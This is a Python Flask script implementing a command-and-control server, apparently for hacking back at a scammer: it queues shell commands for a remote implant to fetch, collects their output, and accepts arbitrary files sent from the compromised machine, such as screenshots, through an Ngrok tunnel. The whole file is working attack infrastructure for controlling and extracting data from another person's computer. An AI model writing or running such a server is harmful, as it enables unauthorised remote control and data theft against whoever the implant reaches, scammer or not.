#!/usr/bin/env python3
from flask import Flask, request, jsonify
import queue
import os
import time

app = Flask(__name__)

# Command Queue for the C2
command_queue = queue.Queue()
output_log = []

# ================= C2 ROUTES (Existing) =================

@app.route('/command', methods=['GET', 'POST'])
def handle_command():
    if request.method == 'POST':
        data = request.get_json()
        if data and 'command' in data:
            command_queue.put(data['command'])
            print(f"[+] Command added to queue: {data['command']}")
            return jsonify({'status': 'command_added'}), 200
        return jsonify({'status': 'error', 'message': 'Missing command'}), 400
    else:
        try:
            cmd = command_queue.get_nowait()
            return jsonify({'command': cmd, 'status': 'success'})
        except queue.Empty:
            return jsonify({'command': '', 'status': 'no_command'})

@app.route('/output', methods=['POST'])
def receive_output():
    data = request.get_json()
    if data and 'output' in data:
        output_log.append(data['output'])
        print(f"\n[+] Output received from Scammer:\n{data['output']}\n{'-'*50}")
        return jsonify({'status': 'ok'}), 200
    return jsonify({'status': 'error'}), 400

@app.route('/health', methods=['GET'])
def health():
    return "Expert C2 is running!", 200

# ================= NEW GENERIC FILE UPLOAD ROUTE =================

@app.route('/upload', methods=['POST'])
def upload_file():
    """
    Receives ANY binary file via the same Ngrok tunnel.
    Saves it to the 'c2_uploads' directory with the specified filename.
    Usage: POST /upload?filename=my_file.jpg
    """
    try:
        # 1. Create the upload directory if it doesn't exist
        upload_dir = "c2_uploads"
        if not os.path.exists(upload_dir):
            os.makedirs(upload_dir)
            print(f"[*] Created upload directory: {upload_dir}")

        # 2. Get the filename from the query string (e.g., ?filename=screenshot.jpg)
        # If no filename is provided, generate one using a timestamp.
        filename = request.args.get('filename')
        if not filename:
            filename = f"file_{int(time.time())}.bin"
            print(f"[!] No filename provided. Using default: {filename}")

        # Optional: Basic security check to prevent path traversal (e.g., ../../)
        # We just strip any path characters and keep the base name.
        filename = os.path.basename(filename)
        
        # 3. Get the raw binary data from the request body
        file_data = request.get_data()
        if not file_data:
            return "No data received", 400

        # 4. Save the file
        file_path = os.path.join(upload_dir, filename)
        with open(file_path, 'wb') as f:
            f.write(file_data)

        print(f"\n[+] FILE RECEIVED! Saved as: {file_path} (Size: {len(file_data)} bytes)")
        return f"File uploaded successfully as {filename}", 200

    except Exception as e:
        print(f"[!] Error saving file: {e}")
        return "Upload failed", 500

# ================= RUN SERVER =================

if __name__ == "__main__":
    print("[*] All-in-One C2 Server starting on port 4444...")
    print("[*] Routes available:")
    print("    - /command       (C2 command queue)")
    print("    - /output        (Receive command output)")
    print("    - /upload        (Receive ANY file. Usage: /upload?filename=file.txt)")
    print("[*] Waiting for Scammer payload to call home...")
    app.run(host='0.0.0.0', port=4444, threaded=True)
